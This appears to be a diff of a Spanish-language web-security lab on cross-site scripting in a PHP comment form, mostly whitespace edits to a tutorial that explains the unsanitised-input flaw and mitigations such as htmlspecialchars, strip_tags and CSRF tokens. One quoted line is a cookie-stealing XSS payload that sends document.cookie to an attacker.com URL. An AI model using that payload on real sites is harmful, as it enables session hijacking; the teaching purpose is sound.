@@ -44,9 +44,12 @@ if (isset($_POST['comment'])) {
 	<button type="submit">Enviar</button>
 </form>
 ~~~
+
 Este código muestra un formulario donde el usuario puede ingresar un comentario en un campo de texto. Cuando
 el usuario envía el formulario, el comentario ingresado se muestra en la pantalla con el mensaje "Comentario publicado:
-\[comentario\]". El Código no sanitiza la entrada del usuario, lo que permite inyectar scripts maliciosos.
+\[comentario\]". 
+
+El Código no sanitiza la entrada del usuario, lo que permite inyectar scripts maliciosos.
 
 ![](images/xss1.png)
 
@@ -72,14 +75,15 @@ Podríamos redirigir a una página de phishing:
 Podemos capturar cookies del usuario (en ataques reales):
 
 `<script>document.write('<img src="http://attacker.com/steal.php?cookie='+document.cookie+'">')</script>`
+
 Con esto, un atacante podría robar sesiones de usuarios.
 
 ![](images/xss4.png)
 
-###**Mitigación**
+### **Mitigación**
 ---
 **Uso de filter_input() para filtrar caracteres.**
-
+---
 Filtra caracteres problemáticos.
 
 Crea el documento comment1.php con el siguiente contenido:
@@ -115,6 +119,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <button type="submit">Enviar</button>
 </form>
 ~~~
+
 ![](files/xss5.png)
 
 Creamos una función filter_string_polyfill que nos va a eliminar todos los caracteres nulos y nos cambia caracteres conflictivos.
@@ -125,9 +130,11 @@ htmlspecialchars() convierte caracteres especiales en texto seguro:
 - <script> → &lt;script&gt;
 - " → &quot;
 - ' → &#39;
+
 Con esta corrección, el intento de inyección de JavaScript se mostrará como texto en lugar de ejecutarse.
 
 Crea un archivo comment2.php con el siguiente contenido 
+
 ~~~
 <?php
 if (isset($_POST['comment'])) {
@@ -169,6 +176,7 @@ if (!empty($comment) && strlen($comment) <= 500) {
         <button type="submit">Enviar</button>
 </form>
 ~~~
+
 Evita comentarios vacíos o excesivamente largos (500 caracteres).
 
 ![](files/xss6.png)
@@ -177,17 +185,21 @@ Evita comentarios vacíos o excesivamente largos (500 caracteres).
 ---
 Si bien htmlspecialchars() mitiga la ejecución de scripts en el navegador, se puede reforzar con strip_tags() si
 solo se quiere texto sin etiquetas HTML:
+
 `$comment = strip_tags($_POST['comment']);`
+
 Elimina etiquetas HTML completamente. Útil si no quieres permitir texto enriquecido (bold, italic, etc.).
 
 Si en cambio si se quiere permitir algunas etiquetas (por ejemplo, <b> y <i>), se puede hacer:
+
 `$comment = strip_tags($_POST['comment'], '<b><i>');`
 
--
 **Protección contra ataques CSRF**
 ---
 Actualmente, cualquiera podría enviar comentarios en el formulario con una solicitud falsa desde otro sitio web.
+
 Para prevenir esto, se puede generar un token CSRF y verificarlo antes de procesar el comentario.
+
 En la [proxima actividad sobre ataques CSRF]() lo veremos más detenidamente.
 
 _Generar y almacenar el token en la sesión_
